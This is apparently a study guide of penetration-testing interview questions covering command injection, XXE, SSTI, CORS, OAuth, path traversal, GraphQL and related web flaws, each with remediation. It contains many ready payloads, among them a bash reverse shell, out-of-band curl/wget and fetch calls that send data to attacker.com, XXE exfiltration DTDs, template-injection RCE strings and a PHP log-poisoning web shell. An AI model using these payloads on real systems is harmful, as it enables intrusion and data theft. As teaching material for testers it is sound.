# Web Application & API Pentest – 20 Additional Questions with Answers

---

## Q16: Explain Command Injection. How do you find and exploit it?

**What is Command Injection?**
- Application passes user input directly into a system command
- Attacker injects OS commands that execute on the server

**How to Identify:**
- Look for features that interact with the OS: ping tool, DNS lookup, file conversion, PDF generation, traceroute
- Example — a web-based ping tool:
  ```
  POST /api/network/ping
  {"host": "8.8.8.8"}
  ```
- Server runs:
  ```bash
  ping -c 4 8.8.8.8
  ```

**Exploitation Payloads:**
- Chain your command using command separators:
  ```
  8.8.8.8; whoami
  8.8.8.8 && cat /etc/passwd
  8.8.8.8 | id
  8.8.8.8 || ls -la
  `whoami`
  $(whoami)
  ```
- Server now runs:
  ```bash
  ping -c 4 8.8.8.8; whoami
  ```
- Output shows ping results + `root` (or whatever user the server runs as)

**Blind Command Injection (no output displayed):**
- Use time-based detection:
  ```
  8.8.8.8; sleep 10
  ```
- If the response takes 10 extra seconds → confirmed
- Out-of-band (OOB) detection:
  ```
  8.8.8.8; curl http://attacker.com/$(whoami)
  8.8.8.8; nslookup attacker.com
  8.8.8.8; wget http://attacker.com/proof
  ```
- Check your attacker server logs for the incoming request

**Bypass Filters:**
- If spaces are blocked:
  ```
  cat${IFS}/etc/passwd
  cat<>/etc/passwd
  {cat,/etc/passwd}
  ```
- If keywords are blocked:
  ```
  w'h'o'a'm'i
  w\h\o\a\m\i
  /bin/c?t /etc/passwd      (wildcard)
  ```

**Reverse Shell (full server access):**
  ```
  8.8.8.8; bash -i >& /dev/tcp/attacker_ip/4444 0>&1
  ```
- On attacker machine:
  ```bash
  nc -lvnp 4444
  ```

**Remediation:**
- Never pass user input to OS commands
- Use language-specific APIs instead of system calls (e.g., Python's `socket` instead of `os.system("ping")`)
- If unavoidable, use strict allowlists (only IPs, only alphanumeric)
- Use parameterized commands, not string concatenation

---

## Q17: Explain XML External Entity (XXE) Injection. How do you test for it?

**What is XXE?**
- Application parses XML input without disabling external entity processing
- Attacker defines a malicious entity that reads local files or makes server-side requests

**How to Identify:**
- Look for any feature that accepts XML: file upload (DOCX, XLSX, SVG), SOAP APIs, RSS feed parsers, XML-based config imports

**Basic XXE — Read Local Files:**
  ```xml
  <?xml version="1.0"?>
  <!DOCTYPE foo [
    <!ENTITY xxe SYSTEM "file:///etc/passwd">
  ]>
  <user>
    <name>&xxe;</name>
  </user>
  ```
- `&xxe;` is replaced with the contents of `/etc/passwd`
- Server responds with the file contents inside the `<name>` field

**XXE — Read Windows Files:**
  ```xml
  <!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">
  ```

**XXE — SSRF (access internal services):**
  ```xml
  <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">
  ```
- Fetches AWS metadata from the server side

**Blind XXE (no output reflected):**
- Out-of-band exfiltration via DTD:
  ```xml
  <!DOCTYPE foo [
    <!ENTITY % file SYSTEM "file:///etc/hostname">
    <!ENTITY % dtd SYSTEM "http://attacker.com/evil.dtd">
    %dtd;
  ]>
  ```
- evil.dtd on attacker server:
  ```xml
  <!ENTITY % send SYSTEM "http://attacker.com/?data=%file;">
  %send;
  ```
- Server reads the file and sends its contents to attacker's server

**XXE via File Upload (DOCX/XLSX/SVG):**
- DOCX and XLSX are ZIP files containing XML
- Unzip a DOCX, edit `[Content_Types].xml` or `word/document.xml`:
  ```xml
  <!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
  ```
- Re-zip and upload → server parses the XML inside

**SVG Upload XXE:**
  ```xml
  <?xml version="1.0"?>
  <!DOCTYPE svg [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
  <svg xmlns="http://www.w3.org/2000/svg">
    <text x="0" y="20">&xxe;</text>
  </svg>
  ```

**Tools:**
- Burp Suite (manually inject XXE payloads)
- XXEinjector (automated XXE testing)

**Remediation:**
- Disable DTD processing and external entities in the XML parser
- Java: `factory.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true)`
- PHP: `libxml_disable_entity_loader(true)`
- Use JSON instead of XML where possible

---

## Q18: How do you test for Host Header Injection?

**What is Host Header Injection?**
- Application trusts the `Host` header from the request to generate URLs
- Attacker manipulates the Host header to poison password reset links, cache, or redirect

**Scenario 1 — Password Reset Poisoning (most common):**
- Victim requests password reset:
  ```
  POST /forgot-password
  Host: target.com
  Body: email=victim@target.com
  ```
- Server generates reset link: `https://target.com/reset?token=abc123`
- Attacker intercepts and changes the Host header:
  ```
  POST /forgot-password
  Host: attacker.com
  Body: email=victim@target.com
  ```
- Server generates: `https://attacker.com/reset?token=abc123`
- Victim receives email with the attacker's domain → clicks it → attacker captures the reset token

**How to Test:**
- Intercept any request in Burp, modify the Host header:
  ```
  Host: evil.com
  ```
- Check if the response contains `evil.com` in any URLs, redirects, or links
- Try variations:
  ```
  Host: target.com.evil.com
  Host: evil.com
  X-Forwarded-Host: evil.com
  X-Host: evil.com
  X-Forwarded-Server: evil.com
  Host: target.com
  X-Forwarded-Host: evil.com       ← some apps check X-Forwarded-Host first
  ```

**Scenario 2 — Web Cache Poisoning:**
- Send request:
  ```
  GET /home
  Host: evil.com
  ```
- If the response is cached with `evil.com` in it → all users visiting `/home` see attacker's content
- Can inject malicious JS via cached pages

**Scenario 3 — Access Internal Virtual Hosts:**
  ```
  Host: localhost
  Host: internal-admin.target.com
  Host: 127.0.0.1
  ```
- Might reveal hidden internal applications

**Remediation:**
- Never use the Host header to generate URLs
- Use server-configured base URL instead
- Validate the Host header against a whitelist
- Configure web server to reject requests with unexpected Host headers

---

## Q19: Explain Server-Side Template Injection (SSTI). How do you detect and exploit it?

**What is SSTI?**
- Application uses a template engine (Jinja2, Twig, Freemarker, etc.) and embeds user input directly into a template
- Attacker injects template syntax that gets executed on the server

**How to Detect:**
- Enter mathematical expressions in any input field:
  ```
  {{7*7}}
  ${7*7}
  #{7*7}
  <%= 7*7 %>
  ```
- If the output shows `49` instead of the literal text → SSTI confirmed
- Detection tree:
  ```
  {{7*'7'}} → 7777777 = Jinja2 (Python)
  {{7*'7'}} → 49 = Twig (PHP)
  ${7*7} → 49 = Freemarker (Java) or Mako (Python)
  ```

**Exploitation — Jinja2 (Python/Flask):**
- Read files:
  ```
  {{ ''.__class__.__mro__[1].__subclasses__() }}
  ```
  → Lists all available Python classes
- RCE payload:
  ```
  {{ config.__class__.__init__.__globals__['os'].popen('whoami').read() }}
  ```
  ```
  {{ request.application.__globals__.__builtins__.__import__('os').popen('id').read() }}
  ```

**Exploitation — Twig (PHP):**
  ```
  {{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("whoami")}}
  ```

**Exploitation — Freemarker (Java):**
  ```
  <#assign ex="freemarker.template.utility.Execute"?new()>${ex("whoami")}
  ```

**Exploitation — ERB (Ruby):**
  ```
  <%= system('whoami') %>
  <%= `cat /etc/passwd` %>
  ```

**Real-World Scenario:**
- Web app has a feature: "Hello, {username}!"
- Instead of username, enter: `{{7*7}}`
- Output: "Hello, 49!" → vulnerable
- Escalate to: `{{ ''.__class__.__mro__[1].__subclasses__()[407]('whoami', shell=True, stdout=-1).communicate() }}`

**Tool: tplmap**
  ```bash
  python3 tplmap.py -u "http://target.com/page?name=test"
  ```
- Automatically detects the template engine and exploits it

**Remediation:**
- Never embed user input directly into templates
- Use the template engine's built-in sandboxing
- Treat template input like code — validate and sanitize strictly
- Use logic-less templates where possible (Mustache, Handlebars)

---

## Q20: How do you test for WebSocket security vulnerabilities?

**What are WebSockets?**
- Persistent, bidirectional connection between client and server
- Used in: chat apps, live notifications, trading platforms, gaming
- Starts with an HTTP upgrade request, then switches to `ws://` or `wss://` protocol

**How to Identify WebSockets:**
- Open browser DevTools → Network tab → filter by "WS"
- Look for the upgrade request:
  ```
  GET /chat HTTP/1.1
  Upgrade: websocket
  Connection: Upgrade
  ```

**Vulnerability 1 — No Authentication on WebSocket:**
- Capture the WebSocket connection URL
- Open a new browser/tool and connect directly:
  ```javascript
  let ws = new WebSocket("wss://target.com/chat");
  ws.onmessage = (e) => console.log(e.data);
  ```
- If you receive messages without authentication → broken access control

**Vulnerability 2 — Cross-Site WebSocket Hijacking (CSWSH):**
- Similar to CSRF but for WebSockets
- The WebSocket handshake relies on cookies → no CSRF token protection
- Create malicious HTML:
  ```html
  <script>
    var ws = new WebSocket("wss://target.com/chat");
    ws.onmessage = function(e) {
      // Send victim's messages to attacker
      fetch("https://attacker.com/log?data=" + btoa(e.data));
    };
  </script>
  ```
- Victim visits this page → browser opens WebSocket with victim's cookies → attacker reads all messages

**Vulnerability 3 — Injection via WebSocket Messages:**
- Send XSS payload through chat:
  ```json
  {"message": "<img src=x onerror=alert(document.cookie)>"}
  ```
- If the chat renders HTML → XSS on all connected users (Stored XSS via WebSocket)
- Try SQL injection:
  ```json
  {"search": "' OR 1=1 --"}
  ```

**Vulnerability 4 — No Rate Limiting:**
- Send thousands of messages rapidly through WebSocket
- Can cause DoS or brute-force attacks on WebSocket-based login

**Testing with Burp Suite:**
- Burp Suite Pro supports WebSocket interception
- You can view, modify, and replay WebSocket messages
- Send to Repeater for manual testing

**Remediation:**
- Authenticate WebSocket connections (validate tokens, not just cookies)
- Check the `Origin` header during the handshake
- Validate and sanitize all WebSocket messages server-side
- Implement rate limiting on WebSocket messages
- Use `wss://` (encrypted) instead of `ws://`

---

## Q21: Explain HTTP Request Smuggling. How does it work?

**What is HTTP Request Smuggling?**
- Front-end server (load balancer/CDN) and back-end server disagree on where one request ends and the next begins
- Attacker "smuggles" a hidden request inside a normal request

**Why It Happens:**
- Two headers determine request body length:
  - `Content-Length` (CL) — exact byte count
  - `Transfer-Encoding: chunked` (TE) — body sent in chunks
- Front-end uses one, back-end uses the other → desync

**CL.TE Attack (front uses Content-Length, back uses Transfer-Encoding):**
  ```
  POST / HTTP/1.1
  Host: target.com
  Content-Length: 13
  Transfer-Encoding: chunked

  0

  SMUGGLED
  ```
- Front-end reads 13 bytes (includes "0\r\n\r\nSMUGGLED") → forwards everything
- Back-end sees chunked → reads until `0` (end of chunks) → "SMUGGLED" becomes the start of the NEXT request

**TE.CL Attack (front uses Transfer-Encoding, back uses Content-Length):**
  ```
  POST / HTTP/1.1
  Host: target.com
  Content-Length: 3
  Transfer-Encoding: chunked

  8
  SMUGGLED
  0

  ```
- Front-end sees chunked → reads full body → forwards it
- Back-end uses Content-Length: 3 → reads only `8\r\n` → "SMUGGLED\r\n0\r\n" is treated as the next request

**Real-World Impact:**
- **Bypass security controls:** Smuggle a request to `/admin` that the front-end WAF would normally block
- **Poison web cache:** Smuggle a request that caches attacker content for other users
- **Steal other users' requests:** Smuggled request captures the next user's request (including their cookies)

**How to Detect:**
- Use Burp Suite extension: **HTTP Request Smuggler**
- Send timing-based detection requests:
  - If CL.TE → send a request with mismatched CL and TE → observe timeout or unusual response
- Tool: `smuggler.py`
  ```bash
  python3 smuggler.py -u https://target.com
  ```

**Remediation:**
- Use HTTP/2 end-to-end (not vulnerable to classic smuggling)
- Configure front-end and back-end to use the same parsing method
- Reject ambiguous requests (both CL and TE present)
- Normalize requests at the load balancer

---

## Q22: How would you test for Business Logic Vulnerabilities?

**What Are Business Logic Flaws?**
- Application works as coded, but the logic itself is flawed
- Scanners can't find these — requires manual thinking and understanding of the application's purpose

**Example 1 — Price Manipulation:**
- Add item to cart → intercept the request:
  ```json
  POST /api/cart/add
  {"product_id": 1001, "price": 999.99, "quantity": 1}
  ```
- Modify the price:
  ```json
  {"product_id": 1001, "price": 0.01, "quantity": 1}
  ```
- If server trusts client-side price → buy a $999 item for $0.01

**Example 2 — Negative Quantity/Amount:**
  ```json
  {"product_id": 1001, "price": 999.99, "quantity": -1}
  ```
- Application might credit $999.99 to your account instead of charging

**Example 3 — Coupon/Discount Abuse:**
- Apply coupon code: `SAVE50`
- Apply the same coupon again in the same request or a new request
- If no single-use validation → unlimited discounts
- Try applying multiple different coupons:
  ```
  SAVE50 + WELCOME20 + FREESHIP = more than 100% off?
  ```

**Example 4 — Race Condition (TOCTOU):**
- Account has $100 balance
- Send two simultaneous withdrawal requests for $100:
  ```bash
  # Using Burp Turbo Intruder or curl in parallel
  curl -X POST /api/withdraw -d '{"amount":100}' &
  curl -X POST /api/withdraw -d '{"amount":100}' &
  ```
- Both requests check balance ($100 ≥ $100) before either deducts → both succeed → $200 withdrawn from $100 balance

**Example 5 — Skipping Steps in Multi-Step Process:**
- Checkout flow: Cart → Address → Payment → Confirm
- Skip payment step → directly access:
  ```
  POST /api/order/confirm
  {"order_id": 5001}
  ```
- If server doesn't verify payment was completed → free order

**Example 6 — Referral/Reward Abuse:**
- Create multiple accounts with different emails
- Use your referral code on each
- If no device/IP fingerprinting → unlimited referral bonuses

**Example 7 — Role/Feature Abuse:**
- Free tier user → intercept API request for premium feature:
  ```
  GET /api/premium/export-report
  ```
- If only the UI hides the button but the API doesn't check subscription → free premium access

**How to Test:**
- Understand the application's business flow completely
- Ask: "What would a malicious user try to get for free or abuse?"
- Test every assumption the developer made
- Use Burp Suite to modify every parameter in every step

**Remediation:**
- Validate all business rules server-side (price, quantity, discounts, steps)
- Implement rate limiting and transaction locking for race conditions
- Never trust client-side values for pricing or authorization
- Log and monitor unusual patterns (bulk sign-ups, repeated coupon use)

---

## Q23: Explain CORS Misconfiguration. How do you exploit it?

**What is CORS?**
- Cross-Origin Resource Sharing — controls which external domains can access your API
- Browser enforces it — prevents `evil.com` from reading responses from `target.com`
- Configured via `Access-Control-Allow-Origin` response header

**How to Test:**
- Send a request with a custom Origin header:
  ```
  GET /api/user/profile
  Host: target.com
  Origin: https://evil.com
  ```
- Check the response headers:
  ```
  Access-Control-Allow-Origin: https://evil.com
  Access-Control-Allow-Credentials: true
  ```
- If it reflects YOUR origin + allows credentials → **critical misconfiguration**

**Dangerous Misconfigurations:**

1. **Wildcard with credentials (invalid but sometimes miscoded):**
   ```
   Access-Control-Allow-Origin: *
   Access-Control-Allow-Credentials: true
   ```

2. **Origin reflection (reflects any origin):**
   ```
   Access-Control-Allow-Origin: https://evil.com    ← reflected from request
   Access-Control-Allow-Credentials: true
   ```

3. **Null origin accepted:**
   ```
   Access-Control-Allow-Origin: null
   Access-Control-Allow-Credentials: true
   ```
   - Can be triggered from sandboxed iframes or local files

4. **Weak regex validation:**
   - Server checks if origin contains "target.com"
   - Bypass: `https://target.com.evil.com` or `https://evilltarget.com`

**Exploitation — Stealing User Data:**
  ```html
  <!-- Host this on attacker.com -->
  <script>
    var xhr = new XMLHttpRequest();
    xhr.open('GET', 'https://target.com/api/user/profile', true);
    xhr.withCredentials = true;
    xhr.onload = function() {
      // Send stolen data to attacker
      fetch('https://attacker.com/steal?data=' + btoa(xhr.responseText));
    };
    xhr.send();
  </script>
  ```
- Victim visits attacker.com → browser sends request to target.com with victim's cookies
- Because CORS allows evil.com → browser lets JS read the response → attacker gets victim's profile data

**Impact:**
- Read victim's personal data, API keys, session tokens
- Perform actions on behalf of the victim
- Full account takeover in some cases

**Remediation:**
- Never reflect the Origin header blindly
- Use a strict whitelist of allowed origins
- Avoid `Access-Control-Allow-Origin: *` with credentials
- Avoid `null` origin

---

## Q24: How do you test for HTTP Parameter Pollution (HPP)?

**What is HPP?**
- Sending the same parameter multiple times in a request
- Different servers handle duplicates differently:
  - PHP/Apache → takes the **last** value
  - ASP.NET/IIS → takes **all** values (comma-separated)
  - Python/Flask → takes the **first** value
  - Node.js/Express → takes the **first** or returns an array

**Server-Side HPP — Bypass Validation:**
- Normal transfer request:
  ```
  POST /transfer
  to=1001&amount=500
  ```
- Server validates `to` parameter, then passes to backend
- Inject duplicate:
  ```
  POST /transfer
  to=1001&to=9999&amount=500
  ```
- Validation checks `to=1001` (first value) → passes
- Backend uses `to=9999` (last value) → money goes to attacker

**HPP — WAF Bypass:**
- WAF blocks: `search=<script>alert(1)</script>`
- Split the payload:
  ```
  search=<script>alert&search=(1)</script>
  ```
- WAF checks each separately → looks harmless
- Backend concatenates: `<script>alert(1)</script>` → XSS executes

**HPP — IDOR/Access Control Bypass:**
  ```
  GET /api/profile?user_id=1001&user_id=1002
  ```
- Authorization checks `user_id=1001` (your ID) → allowed
- Data fetched for `user_id=1002` (victim) → IDOR bypass

**Client-Side HPP:**
- Application generates links using user input:
  ```
  https://target.com/share?url=https://target.com/page
  ```
- Inject:
  ```
  https://target.com/share?url=https://target.com/page%26redirect%3Dhttps://evil.com
  ```
- After URL decoding: `url=https://target.com/page&redirect=https://evil.com`
- User gets redirected to attacker's site

**How to Test:**
- Add duplicate parameters to every request in Burp
- Try in URL, body, and headers
- Compare behavior when you change the order of duplicates
- Check if WAF and backend parse parameters differently

**Remediation:**
- Application should explicitly handle duplicate parameters (take first or reject)
- Use a consistent parameter parsing method across all layers
- WAF and backend should parse identically

---

## Q25: Explain OAuth 2.0 vulnerabilities. How would you test an OAuth implementation?

**What is OAuth 2.0?**
- Authorization framework that allows third-party apps to access user data
- Flow: User → Authorization Server → Get Code → Exchange for Token → Access API
- Common in "Login with Google/Facebook/GitHub" features

**Vulnerability 1 — Stealing Authorization Code via Open Redirect:**
- OAuth redirect:
  ```
  https://auth.target.com/authorize?
    client_id=abc&
    redirect_uri=https://app.target.com/callback&
    response_type=code&
    scope=read
  ```
- If `redirect_uri` validation is weak, change it:
  ```
  redirect_uri=https://attacker.com/callback
  redirect_uri=https://app.target.com.attacker.com/callback
  redirect_uri=https://app.target.com/callback/../../../attacker.com
  redirect_uri=https://app.target.com/callback?next=https://attacker.com
  ```
- Auth code is sent to attacker → attacker exchanges it for an access token

**Vulnerability 2 — Missing `state` Parameter (CSRF):**
- If there's no `state` parameter in the OAuth flow:
  - Attacker initiates OAuth flow → gets their own auth code
  - Sends the callback URL to the victim:
    ```
    https://app.target.com/callback?code=ATTACKER_CODE
    ```
  - Victim's account gets linked to attacker's OAuth account
  - Attacker can now log in to victim's account using their OAuth

**Vulnerability 3 — Token Leakage via Referrer Header:**
- After OAuth callback, the page has external links/images
- Access token in URL: `https://app.target.com/callback#access_token=xyz`
- When user clicks an external link → Referrer header leaks the token:
  ```
  Referer: https://app.target.com/callback#access_token=xyz
  ```

**Vulnerability 4 — Scope Escalation:**
- Request token with minimal scope:
  ```
  scope=read
  ```
- Try using the token for higher-privilege actions:
  ```
  DELETE /api/user/account
  Authorization: Bearer <read_only_token>
  ```
- If API doesn't validate scope per endpoint → privilege escalation

**Vulnerability 5 — Implicit Flow Token Theft:**
- If using implicit flow (`response_type=token`), the token is in the URL fragment
- Any XSS on the callback page can steal it:
  ```javascript
  document.location.hash  // contains the access_token
  ```

**How to Test:**
- Map the entire OAuth flow in Burp Suite
- Try modifying `redirect_uri`, `state`, `scope`, `response_type`
- Check if auth codes are single-use and expire quickly
- Check if tokens are properly scoped
- Test for CSRF by removing the `state` parameter

**Remediation:**
- Strict whitelist validation on `redirect_uri` (exact match)
- Always use and validate the `state` parameter
- Use authorization code flow (not implicit)
- Auth codes should be single-use and short-lived
- Validate scopes on every API endpoint

---

## Q26: How do you test for Insecure Direct Object References in File Download/Path Traversal?

**What is Path Traversal / Directory Traversal?**
- Application uses user input to construct file paths
- Attacker uses `../` sequences to escape the intended directory and read arbitrary files

**How to Identify:**
- Look for file download/view features:
  ```
  GET /download?file=report.pdf
  GET /api/files?path=documents/invoice.pdf
  GET /image?name=photo.jpg
  ```

**Basic Exploitation:**
  ```
  GET /download?file=../../../etc/passwd
  GET /download?file=....//....//....//etc/passwd
  ```
- If you see the contents of `/etc/passwd` → confirmed

**Common Target Files:**
  ```
  Linux:
  ../../../etc/passwd
  ../../../etc/shadow
  ../../../etc/hosts
  ../../../home/user/.ssh/id_rsa
  ../../../var/log/apache2/access.log
  ../../../proc/self/environ

  Windows:
  ..\..\..\windows\win.ini
  ..\..\..\windows\system32\drivers\etc\hosts
  ..\..\..\inetpub\wwwroot\web.config
  ```

**Bypass Filters:**
- If `../` is stripped:
  ```
  ....//....//....//etc/passwd       (double encoding)
  ..%2f..%2f..%2fetc/passwd          (URL encode /)
  %2e%2e%2f%2e%2e%2f                 (URL encode ..)
  ..%252f..%252f                     (double URL encode)
  ..\/..\/                           (mixed separators)
  ```
- If path must end with `.pdf`:
  ```
  ../../../etc/passwd%00.pdf         (null byte — older systems)
  ../../../etc/passwd#.pdf           (fragment)
  ```

**Path Traversal to RCE via Log Poisoning:**
1. Inject PHP code into Apache logs:
   ```
   GET /<?php system($_GET['cmd']); ?> HTTP/1.1
   ```
2. Include the log file via path traversal:
   ```
   GET /download?file=../../../var/log/apache2/access.log&cmd=whoami
   ```

**Tools:**
- Burp Intruder with path traversal wordlist
- dotdotpwn:
  ```bash
  dotdotpwn -m http -h target.com -f /etc/passwd
  ```

**Remediation:**
- Use a whitelist of allowed filenames
- Never use user input directly in file paths
- Use `chroot` or jail the file access to a specific directory
- Strip `../` and normalize paths server-side
- Use file IDs mapped to paths in a database instead of raw filenames

---

## Q27: How do you test API authentication tokens (API Keys, Bearer Tokens)?

**Test 1 — Token in URL (Information Leakage):**
- Check if API key is passed in URL:
  ```
  GET /api/data?api_key=sk_live_abc123
  ```
- This leaks in: browser history, server logs, Referrer header, proxy logs
- Should be in headers instead:
  ```
  Authorization: Bearer sk_live_abc123
  ```

**Test 2 — Token Entropy / Predictability:**
- Generate multiple tokens and compare:
  ```
  Token 1: api_1001_abc123
  Token 2: api_1002_abc124
  Token 3: api_1003_abc125
  ```
- If there's a pattern → tokens are predictable → attacker can guess valid tokens
- Good tokens should be random: `f8a3b2c1d9e7...` (high entropy)

**Test 3 — Token Scope Validation:**
- Get a read-only API key
- Try write operations:
  ```
  DELETE /api/users/1001
  Authorization: Bearer <read_only_key>
  ```
- If it works → scope not enforced

**Test 4 — Token Expiry:**
- Note the token, wait for the stated expiry time
- Replay the token:
  ```
  GET /api/profile
  Authorization: Bearer <expired_token>
  ```
- If it still works → no expiry enforcement

**Test 5 — Token Revocation:**
- Logout or regenerate API key
- Use the old token:
  ```
  GET /api/profile
  Authorization: Bearer <old_revoked_token>
  ```
- If it works → revocation is not implemented

**Test 6 — Missing Authentication:**
- Remove the Authorization header entirely:
  ```
  GET /api/users
  (no auth header)
  ```
- If you get data → endpoint has no authentication

**Test 7 — Token Leakage in Error Messages:**
  ```
  GET /api/data
  Authorization: Bearer invalid_token
  ```
- Check if error response leaks: valid token format, user info, internal details

**Test 8 — Cross-User Token Usage:**
- Get tokens for User A and User B
- Use User A's token to access User B's endpoints
- If it works → broken access control

**Remediation:**
- Always pass tokens in headers (not URL)
- Use cryptographically random tokens (UUID v4 or better)
- Implement and enforce token scopes
- Set reasonable expiry times
- Support immediate revocation
- Rate limit token usage

---

## Q28: Explain Subdomain Takeover. How do you find and exploit it?

**What is Subdomain Takeover?**
- Company has a subdomain pointing to a third-party service (GitHub Pages, Heroku, AWS S3, etc.)
- The third-party resource is deleted/unclaimed but the DNS record still exists
- Attacker claims the resource → now controls the subdomain

**How to Find:**

**Step 1 — Enumerate Subdomains:**
  ```bash
  subfinder -d target.com -o subs.txt
  amass enum -passive -d target.com
  assetfinder target.com
  ```

**Step 2 — Check for Dangling CNAMEs:**
  ```bash
  # Check DNS records
  dig blog.target.com CNAME
  # Returns: blog.target.com → target.herokuapp.com

  # Try to access it
  curl https://blog.target.com
  # Returns: "No such app" or "There isn't a GitHub Pages site here"
  ```

**Vulnerable Fingerprints:**
| Service | Error Message |
|---------|--------------|
| GitHub Pages | "There isn't a GitHub Pages site here" |
| Heroku | "No such app" |
| AWS S3 | "NoSuchBucket" |
| Shopify | "Sorry, this shop is currently unavailable" |
| Tumblr | "There's nothing here" |
| Azure | "404 - Web Site is stopped" |

**Step 3 — Exploit (Claim the Resource):**
- Example — Heroku:
  - `blog.target.com` CNAME → `target-blog.herokuapp.com`
  - Heroku returns "No such app"
  - Attacker creates a Heroku app named `target-blog`
  - Now `blog.target.com` serves attacker's content

**Impact:**
- Serve phishing pages on a trusted subdomain
- Steal cookies (if cookie scope includes `*.target.com`)
- Bypass CORS (if `*.target.com` is whitelisted)
- Damage reputation

**Automated Tools:**
  ```bash
  # Using subjack
  subjack -w subs.txt -t 100 -timeout 30 -ssl -v

  # Using nuclei
  nuclei -l subs.txt -t takeovers/

  # Using can-i-take-over-xyz (reference list)
  # https://github.com/EdOverflow/can-i-take-over-xyz
  ```

**Remediation:**
- Remove DNS records when decommissioning third-party services
- Regularly audit subdomain DNS records
- Use monitoring tools to detect dangling records
- Claim all organizational names on major platforms

---

## Q29: Explain HTTP Security Headers and what happens when they're missing.

**Header 1 — Content-Security-Policy (CSP):**
- Controls which resources the browser can load
- Missing → XSS attacks are easier to exploit
  ```
  Content-Security-Policy: default-src 'self'; script-src 'self'; style-src 'self'
  ```
- Testing: Check if CSP is present → if yes, look for bypasses:
  ```
  script-src 'unsafe-inline'     → XSS still possible
  script-src 'unsafe-eval'       → eval() works
  script-src *.googleapis.com    → host JSONP callback = bypass
  ```

**Header 2 — Strict-Transport-Security (HSTS):**
- Forces HTTPS for all future requests
- Missing → user can be downgraded to HTTP (SSL stripping attack with tools like sslstrip)
  ```
  Strict-Transport-Security: max-age=31536000; includeSubDomains; preload
  ```

**Header 3 — X-Frame-Options:**
- Prevents clickjacking (loading the site in an iframe)
- Missing → attacker can overlay invisible iframe trick:
  ```
  X-Frame-Options: DENY
  X-Frame-Options: SAMEORIGIN
  ```
- Test: Try embedding the page in an iframe on your site

**Header 4 — X-Content-Type-Options:**
- Prevents MIME type sniffing
- Missing → browser might execute a file as JavaScript even if served as text/plain
  ```
  X-Content-Type-Options: nosniff
  ```

**Header 5 — Referrer-Policy:**
- Controls how much referrer info is sent
- Missing → full URL (including tokens, session IDs) leaks in Referrer header
  ```
  Referrer-Policy: strict-origin-when-cross-origin
  ```

**Header 6 — Permissions-Policy (formerly Feature-Policy):**
- Controls access to browser features (camera, microphone, geolocation)
  ```
  Permissions-Policy: camera=(), microphone=(), geolocation=()
  ```

**How to Check All Headers:**
  ```bash
  curl -I https://target.com
  ```
- Online tool: securityheaders.com
- Burp Suite: check response headers for every page

**In a Pentest Report:**
- List each missing header
- Explain the specific attack it enables
- Rate as Low/Medium severity (usually Medium)
- Provide the exact header value to add

---

## Q30: How do you test for Clickjacking? Demonstrate with a PoC.

**What is Clickjacking?**
- Attacker loads the target site in a transparent iframe
- Places their own content underneath or over it
- Victim thinks they're clicking on the attacker's page but actually clicking on the target site

**How to Test:**
- Check if the target site can be framed:
  ```bash
  curl -I https://target.com | grep -i "x-frame-options\|content-security-policy"
  ```
- If no `X-Frame-Options` and no `frame-ancestors` in CSP → vulnerable

**PoC — Basic Clickjacking:**
  ```html
  <html>
  <head><title>Win a Free iPhone!</title></head>
  <body>
    <h1>Click the button to claim your prize!</h1>
    <iframe src="https://target.com/account/delete" 
      style="opacity: 0.0; position: absolute; top: 0; left: 0; 
             width: 100%; height: 100%; z-index: 2;">
    </iframe>
    <button style="position: absolute; top: 200px; left: 100px; z-index: 1;">
      Claim Prize
    </button>
  </body>
  </html>
  ```
- The "Claim Prize" button is positioned exactly where the "Delete Account" button is on the target site
- User clicks "Claim Prize" → actually clicks "Delete Account" on the invisible iframe

**PoC — Drag-and-Drop Clickjacking:**
- Attacker can trick users into dragging their auth token into an attacker-controlled field:
  ```html
  <iframe src="https://target.com/settings" style="opacity:0.3;"></iframe>
  <div id="drop-zone" ondrop="steal(event)">
    Drop your file here!
  </div>
  ```

**PoC — Likejacking (Social Media):**
- Hide a Facebook "Like" button under a fake button
- Victim clicks → unknowingly likes attacker's page/post
- Used for spam campaigns and fake engagement

**Multi-Step Clickjacking:**
- Multiple iframes loaded in sequence
- User is tricked into completing a multi-step action:
  - Click 1: Enable setting
  - Click 2: Confirm change
  - Click 3: Submit → attacker changes victim's email

**Remediation:**
  ```
  X-Frame-Options: DENY                         → blocks all framing
  X-Frame-Options: SAMEORIGIN                   → only same-origin framing
  Content-Security-Policy: frame-ancestors 'none'  → modern replacement
  ```
- Use `SameSite=Strict` cookies to prevent authenticated actions in iframes

---

## Q31: How do you approach testing a GraphQL API specifically?

**Step 1 — Find the GraphQL Endpoint:**
- Common paths:
  ```
  /graphql
  /graphql/v1
  /api/graphql
  /gql
  /query
  ```
- Send a test query:
  ```json
  POST /graphql
  {"query": "{ __typename }"}
  ```
- If it returns `{"data":{"__typename":"Query"}}` → confirmed

**Step 2 — Introspection (Schema Discovery):**
  ```json
  {"query": "{ __schema { queryType { name } mutationType { name } types { name fields { name type { name } } } } }"}
  ```
- This reveals ALL types, queries, mutations, and fields
- Tool: GraphQL Voyager → visualizes the schema

**Step 3 — Test for Information Disclosure:**
- Look for sensitive fields exposed:
  ```json
  {"query": "{ users { id email password ssn apiKey } }"}
  ```
- Check if you can query admin-only data:
  ```json
  {"query": "{ adminSettings { secretKey databaseUrl } }"}
  ```

**Step 4 — Test for BOLA/IDOR:**
  ```json
  {"query": "{ user(id: 1002) { name email orders { total } } }"}
  ```
- Change the `id` and check if you can access other users' data

**Step 5 — Test for Injection:**
  ```json
  {"query": "{ user(name: \"admin' OR '1'='1\") { id } }"}
  ```

**Step 6 — Batching Attack (Brute Force):**
- GraphQL allows multiple queries in one request:
  ```json
  [
    {"query": "mutation { login(email:\"admin@target.com\", password:\"pass1\") { token } }"},
    {"query": "mutation { login(email:\"admin@target.com\", password:\"pass2\") { token } }"},
    {"query": "mutation { login(email:\"admin@target.com\", password:\"pass3\") { token } }"}
  ]
  ```
- Sends 100+ login attempts in ONE request → bypasses rate limiting

**Step 7 — Nested Query DoS (Resource Exhaustion):**
  ```json
  {"query": "{ users { posts { comments { author { posts { comments { author { name } } } } } } } }"}
  ```
- Deeply nested → exponential database queries → server crash

**Step 8 — Test Mutations for Mass Assignment:**
  ```json
  {"query": "mutation { updateUser(id: 1001, role: \"admin\", verified: true) { id role } }"}
  ```

